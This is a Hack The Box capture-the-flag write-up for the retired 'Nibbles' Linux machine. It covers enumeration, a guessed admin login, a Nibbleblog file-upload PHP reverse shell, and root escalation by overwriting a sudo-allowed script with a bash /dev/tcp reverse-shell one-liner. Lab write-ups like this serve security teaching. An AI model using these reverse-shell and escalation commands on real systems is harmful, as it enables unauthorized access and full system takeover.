---
title: "HTB: Nibbles Writeup"
date: 2025-08-20 08:00:00 +0000
categories: [CTF, HTB]
tags: [ctf, htb, easy, enumeration, privilege-escalation, web, linux]
author: "Saad Azil"
pin: false
---

![Nibbles Box](/assets/images/nibbles/NIBBLES.png)

**OS:** Linux  
**Difficulty:** Easy  
**Machine IP:** 10.10.10.75

Nibbles is a retired box on Hack The Box that provides a great introduction to common enumeration techniques, web application exploitation, and privilege escalation through file misconfigurations.

---

## Enumeration

The first step is to scan the target machine with `nmap` to identify open ports and services.

```bash
nmap -sV -sC -oN nmap_scan 10.10.10.75
```

![Nmap Scan](/assets/images/nibbles/nmap_scan.png)

The scan reveals two open ports:
- **Port 22:** SSH
- **Port 80:** HTTP

Before exploring the web server, I added the machine's IP to my `/etc/hosts` file to access it by its domain name, `nibbles.htb`.

![Domain Name](/assets/images/nibbles/domain_name.png)

Navigating to `http://nibbles.htb` in a browser initially shows a blank page. However, viewing the page's source code reveals a hidden directory: `/nibbleblog/`.

![Source Page](/assets/images/nibbles/source_page.png)

This directory leads to a blog powered by Nibbleblog.

![Blog Page](/assets/images/nibbles/blog_page.png)

To find more hidden files or directories, I used `gobuster`:

```bash
gobuster dir -u http://nibbles.htb/nibbleblog/ -w /usr/share/wordlists/dirb/common.txt
```

![Dir Enum Result](/assets/images/nibbles/dir_enum_result.png)

The `README` file reveals the Nibbleblog version: `v4.0.3`.

![Readme](/assets/images/nibbles/readme.png)

A quick search for this version reveals a critical vulnerability: **Arbitrary File Upload**. To exploit this, we need to gain access to the admin panel. After some guessing, I found the credentials to be:

- **Username:** `admin`
- **Password:** `nibbles`

## Gaining a Foothold

With admin access, I could now exploit the file upload vulnerability. The goal is to upload a reverse shell. I used a common PHP reverse shell script.

1.  **Login** to the admin panel at `http://nibbles.htb/nibbleblog/admin.php`.
2.  Navigate to **Plugins** â†’ **My Image**.
3.  **Upload** the PHP reverse shell.

![Reverse Shell Upload](/assets/images/nibbles/reverse_shell.png)

Once the shell is uploaded, set up a Netcat listener on your local machine:

```bash
nc -lvnp 6666
```

Then, access the uploaded shell at `http://nibbles.htb/nibbleblog/content/private/plugins/my_image/image.php` to trigger the connection.

![Get Shell](/assets/images/nibbles/get_shell.png)

I upgraded the shell for better stability:

```bash
script /dev/null -c bash
```

![Shell Upgrade](/assets/images/nibbles/shell_upgrade.png)

Now, as the `nibbler` user, I can grab the user flag from the home directory.

![First Flag](/assets/images/nibbles/first_flag.png)

---

## Privilege Escalation

To escalate privileges, I checked for `sudo` permissions:

```bash
sudo -l
```

![sudo](/assets/images/nibbles/sudo-l.png)

The output shows that the `nibbler` user can run `/home/nibbler/personal/stuff/monitor.sh` as `root` without a password.

I found a `personal.zip` file in the user's home directory, which I unzipped to find the `monitor.sh` script.

![Unzip The File](/assets/images/nibbles/the_zip_file.png)

Since I have write permissions on the script, I can overwrite it with a payload to get a root shell. I echoed a new reverse shell command into the script:

```bash
echo "bash -c 'bash -i >& /dev/tcp/10.10.14.29/6666 0>&1'" > monitor.sh
```

![overwrote](/assets/images/nibbles/overrideFile.png)

I started another Netcat listener on port `6666` and executed the script with `sudo`:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

![run the reverse shell](/assets/images/nibbles/run_the_reverse_shell.png)

This provides a root shell.

![get the root shell](/assets/images/nibbles/get_root_shell.png)

Finally, I could read the root flag.

![root flag](/assets/images/nibbles/root_flag.png)

And we are done!